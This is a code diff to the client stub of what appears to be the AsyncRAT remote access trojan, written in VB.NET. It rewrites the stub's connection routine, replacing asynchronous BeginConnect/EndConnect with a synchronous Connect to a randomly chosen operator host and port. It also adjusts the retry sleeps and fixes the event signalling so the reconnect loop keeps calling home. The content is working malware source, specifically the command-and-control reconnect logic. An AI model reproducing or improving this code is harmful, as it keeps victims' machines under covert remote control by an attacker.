@@ -70,8 +70,8 @@ Namespace AsyncRAT_Stub
         Public Shared Buffer() As Byte
         Public Shared MS As MemoryStream = Nothing
         Public Shared ReadOnly SPL = Settings.SPL
-        Public Shared allDone As New ManualResetEvent(False)
         Public Shared Tick As Threading.Timer = Nothing
+        Public Shared allDone As New ManualResetEvent(False)
 
         Public Shared Sub Main()
 
@@ -81,20 +81,19 @@ Namespace AsyncRAT_Stub
 
 
             While True
-                Thread.Sleep(1000)
+                Thread.Sleep(2.5 * 1000)
                 If isConnected = False Then
                     isDisconnected()
-                    BeginConnect()
+                    Connect()
                 End If
                 allDone.WaitOne()
             End While
 
         End Sub
 
-        Public Shared Sub BeginConnect()
+        Public Shared Sub Connect()
 
             Try
-                Thread.Sleep(2500)
 
                 S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
@@ -105,18 +104,8 @@ Namespace AsyncRAT_Stub
                 S.ReceiveBufferSize = 50 * 1000
                 S.SendBufferSize = 50 * 1000
 
-                S.BeginConnect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)), New AsyncCallback(AddressOf EndConnect), Nothing)
-
-            Catch ex As Exception
-                Debug.WriteLine("BeginConnect")
-                isConnected = False
-            End Try
-        End Sub
-
-        Public Shared Sub EndConnect(ByVal ar As IAsyncResult)
-            Try
-                S.EndConnect(ar)
-                Debug.WriteLine("EndConnect : Connected")
+                S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
+                Debug.WriteLine("Connect : Connected")
 
                 isConnected = True
                 allDone.Set()
@@ -126,10 +115,10 @@ Namespace AsyncRAT_Stub
 
                 Dim T As New TimerCallback(AddressOf Ping)
                 Tick = New Threading.Timer(T, Nothing, 30000, 30000)
-
             Catch ex As Exception
-                Debug.WriteLine("EndConnect : Failed")
+                Debug.WriteLine("Connect : Failed")
                 isConnected = False
+                allDone.Set()
             End Try
         End Sub
 
@@ -259,7 +248,6 @@ Namespace AsyncRAT_Stub
                 End Try
             End If
 
-            allDone.Set()
 
         End Sub
 
